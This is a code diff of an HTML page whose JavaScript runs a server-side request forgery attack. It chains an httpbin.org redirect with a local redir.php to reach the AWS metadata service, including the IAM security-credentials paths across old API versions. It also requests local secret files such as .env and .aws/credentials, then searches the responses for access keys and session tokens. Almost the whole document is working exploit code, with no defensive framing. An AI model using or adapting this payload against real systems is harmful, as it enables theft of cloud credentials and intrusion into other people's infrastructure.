@@ -1,68 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Protocol Bypass Attack</title>
+    <title>AWS Metadata v1 Attack</title>
 </head>
 <body>
-    <h1>🛠️ Protocol & Method Bypass Attack</h1>
+    <h1>🎯 AWS Metadata Service v1 + Localhost Exploration</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Try different HTTP methods and protocols
-        var protocolTests = [
-            // Different HTTP methods on httpbin.org that might behave differently
-            { method: 'POST', url: 'http://httpbin.org/post', data: 'metadata_request=169.254.169.254/latest/meta-data/' },
-            { method: 'PUT', url: 'http://httpbin.org/put', data: 'target=127.0.0.1' },
-            { method: 'POST', url: 'http://httpbin.org/anything', data: 'cmd=curl 169.254.169.254/latest/meta-data/' },
+        // Since we confirmed httpbin.org redirect works, try AWS metadata v1 endpoints
+        var awsV1Tests = [
+            // AWS Metadata Service v1.0 (no token required!)
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/iam/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
             
-            // Try to use httpbin.org forms that might process our input differently
-            { method: 'POST', url: 'http://httpbin.org/post', data: 'url=http://169.254.169.254/latest/meta-data/&submit=true' },
+            // Try older AWS API versions
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2007-01-19/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2008-02-01/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2009-04-04/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2011-01-01/meta-data/',
             
-            // Try GET with custom headers via httpbin.org
-            { method: 'GET', url: 'http://httpbin.org/headers', data: null },
+            // Try without /latest/ prefix
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/user-data/',
             
-            // Test httpbin.org's capability to make outbound requests
-            { method: 'GET', url: 'http://httpbin.org/links/10/0', data: null },
-            { method: 'GET', url: 'http://httpbin.org/range/26', data: null },
+            // Explore localhost since it returned 3201 bytes!
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=https://www.google.com',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.env',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.aws/credentials',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/config.php',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/phpinfo.php',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/debug.php',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/credentials',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/aws-credentials',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/secret/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/admin/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/backup/',
             
-            // Try httpbin.org with different encodings
-            { method: 'GET', url: 'http://httpbin.org/encoding/utf8', data: null },
-            { method: 'GET', url: 'http://httpbin.org/gzip', data: null },
-            { method: 'GET', url: 'http://httpbin.org/deflate', data: null },
+            // Try to access AWS metadata via 127.0.0.1 (might have different routing)
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1:169/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/meta-data/',
         ];
         
-        for(var i = 0; i < protocolTests.length; i++) {
+        for(var i = 0; i < awsV1Tests.length; i++) {
             try {
-                var test = protocolTests[i];
-                results += "<h3>🔬 " + test.method + " " + test.url + "</h3>";
-                
+                results += "<h3>🎯 " + (i+1) + ": " + awsV1Tests[i].split('url=')[1] + "</h3>";
                 var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(awsV1Tests[i]), false);
+                xhr.send();
                 
-                if(test.method === 'GET') {
-                    xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(test.url), false);
-                    xhr.send();
-                } else {
-                    // For POST/PUT, we'll send the data as part of the URL
-                    var fullUrl = test.url + '?' + test.data;
-                    xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(fullUrl), false);
-                    xhr.send();
-                }
-                
-                if(xhr.responseText && xhr.responseText.length > 10) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>📡 RESPONSE: " + xhr.responseText.length + " bytes</div>";
+                if(xhr.responseText && xhr.responseText.trim().length > 5) {
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 SUCCESS: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Check for any leaked internal information
+                    // Look for AWS credentials
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('169.254') || text.includes('localhost') || text.includes('127.0.0.1')) {
-                        results += "<div style='background:#ff6b6b;color:white;padding:8px;'>🎯 INTERNAL IP DETECTED!</div>";
+                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
+                        results += "<div style='background:#ff0000;color:white;padding:10px;border:3px solid red;'>🚨 AWS CREDENTIALS FOUND! 🚨</div>";
                     }
-                    if(text.includes('aws') || text.includes('ec2') || text.includes('amazon')) {
-                        results += "<div style='background:#ffa500;color:white;padding:8px;'>☁️ AWS CONTEXT FOUND!</div>";
+                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🔑 IAM ROLE DETECTED!</div>";
+                    }
+                    if(text.includes('ami-') || text.includes('instance-') || text.includes('vol-')) {
+                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS METADATA FOUND!</div>";
+                    }
+                    if(text.includes('401') || text.includes('unauthorized')) {
+                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ 401 Unauthorized (need token)</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:8px;max-height:120px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 600) + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                 } else {
                     results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                 }
